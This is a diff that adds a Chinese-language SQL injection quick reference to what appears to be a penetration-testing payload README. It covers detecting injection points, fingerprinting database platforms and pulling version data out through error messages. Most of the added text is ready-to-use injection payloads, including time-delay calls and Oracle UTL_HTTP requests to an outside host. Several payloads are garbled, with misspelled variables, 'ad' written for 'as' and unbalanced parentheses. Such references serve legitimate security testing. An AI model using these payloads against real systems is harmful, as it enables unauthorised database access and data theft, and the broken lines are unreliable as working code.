@@ -37,6 +37,132 @@ Attempting to manipulate SQL queries may have goals including:
 * [Insert Statement - ON DUPLICATE KEY UPDATE](#insert-statement---on-duplicate-key-update)
 * [WAF Bypass](#waf-bypass)
 
+## sql注入快速参考
+
+1. 识别SQL注入漏洞
+
+   1.1 异常的输入是否会产生数据库错误。
+    
+    当输入SQL元字符或异常、错误的数据类型，有可能产生数据库错误。常见的测试用例包括在字符串字段中输入单引号字符，或者在数值字段中输入随机的字符串。
+    通过HTTP的状态码，或者在页面中描述性的错误消息来识别这种数据库错误。
+
+   1.2 合法、正确的输入是否可以替换等效的SQL表达式。
+    
+    如果遇到错误，修改输入的数据以分析错误，确定输入的数据是否导致了SQL语法错误。例如单双引号的导致的错误以及正常的回显，需要数字的地方提供了字符串。
+
+   1.2.1 数值类型
+
+    当需要确认注入点是数字型注入时，可先使用不同的数值来查看服务器对此参数是否做出响应，如果做出响应则此参数是动态的，之后提交一个SQL注入表达式，该表达式将被计算为事先确定好的正确值，然后提交服务器查看是否和表达式结果页面是一致的，常用函数为ASCII(),例如51-ASCII(2)和1的页面基本一致。MSSQL，Oracle，Mysql，Pg都支持次函数。
+
+   1.2.2 字符串数据
+
+    当为字符串类型时，思路和数值类型基本一致。一种常用的策略是将字符串拆分成两个或多个子串，然后再使用SQL语法在服务器端将这些子串连接起来。字符串的连接根据不同的平台采用不同的连接符号：MSSQL中使用+，Oracle、Postgresql中||，Mysql中 。
+    简单示例
+    ```shoes=sho'+/%2b/||/ /%20'es。```
+
+   1.3 在服务器的响应中，SQL条件表达式的附加部分是否产生一致的差异性。
+
+   ```
+   id=100    id=100 and 1=1
+   id=100    id=100 and 1=2
+   ```
+
+   ```
+   q=aaa     q=aaa' and 'a'='a
+   q=aaa     q=aaa' and 'a'='b
+   q=aaa     q=aaa' and 1=1-- 
+   q=aaa     q=aaa' and 1=2-- 
+   ```
+
+   1.4 是否有可能触发可度量的时间延长。
+    通过SQL注入触发可度量的时间延长，既可以用来确认是否存在注入，在正常情况下也可以用来识别后台数据库。
+
+
+
+
+2. 识别数据库平台
+   
+   2.1 通过时间延迟识别数据库
+
+  ```
+   MSSQL WAITFOR DELAY '0:0:10'
+  ```
+
+  ```
+   Oracle BEGIN DBMS_LOCK.SLEEP(5);END;-- 
+          SELECT UTL_INADDR.get_host_name('192.168.1.1') FROM dual
+          SELECT UTL_INADDR.get_host_address('www.mxding999.com') FROM dual
+          SELECT UTL_HTTP.REQUEST('http://www.mxding999.com') FROM dual 
+  ```
+
+  ```
+   Mysql  BENCHMARK(100000,MD5('SQL')) -- 低于5.0.12
+          SLEEP(10)   -- 5.0.1或更高版本
+  ```
+
+  ```
+   Postgresql  SELECT pg_sleep(10);   --8.2及更高版本
+  ```
+
+   2.2 通过SQL方言推理识别数据库
+
+| 平台 | 连接符 | 行注释 | 唯一的默认表、变量或函数 | int转char函数 |
+| ---  | ---   | ---    |       ---             |   ---        |
+|MSSQL | 'a'+'b' | --| @@PACK_RECEIVED | char(0x41) |
+|Mysql | concat('a','b') / 'a' 'b'| # | CONNECTION_ID() | char(0x41)|
+|Oracle | concat('a','b') / 'a'\|\|'b' | -- | BITAND(1,1) | chr(65) |
+|Access | "a" & "b" | N/A | msysobjects | chr(65) |
+|Postgresql | 'a'\|\|'b' | -- | getpgusername() | chr(65) |
+|DB2   | 'a' concat 'b'  | -- | sysibm.systables | chr(65) |
+
+   可以使用以下语句来识别数据库服务器。在每一种情况下，注入的语句只能在它预期的数据库上执行成功，在其它数据库上执行失败。
+   以下语句都价于注入字符串; ' AND 1=1--:
+
+   MSSQL 
+   ```
+   ' AND @@PACK_RECEIVED = @@ PACK_RECVIED -- 
+   ```
+
+   Mysql 
+   ```
+   ' AND CONNECTION_ID() = CONNECTION_ID() --
+   ```
+
+   Oracle
+   ```
+   ' AND BITAND(1,1) = BITAND(1,1) --
+   ```
+
+   Postgresql
+   ```
+   ' AND getpgusername() = getpgusername() --
+   ```
+
+   2.3 通过错误消息提取数据
+
+   下面这些例子将引发一个错误，在返回的错误消息中包含数据库版本信息。
+
+   MSSQL
+   ```
+   AND 1 in (select @@version) -- 
+   AND 1=CONVERT(INT,(SELECT @@VERSION)) --
+   ```
+
+   Mysql
+   ```
+   AND (select 1 from (select count(*),concat((select version()),floor(rand(0)*2))x from information_schema.tables group by x)a)#
+   ```
+
+   Oracle
+   ```
+   AND 1=(utl_inaddr.get_host_name((select banner from v$version where rownum=1)) --
+   ```
+
+   Postgresql
+   ```
+   AND 1=cast((select version() )::text ad numeric) --
+   ```
+
 ## Entry point detection
 
 Detection of an SQL injection entry point
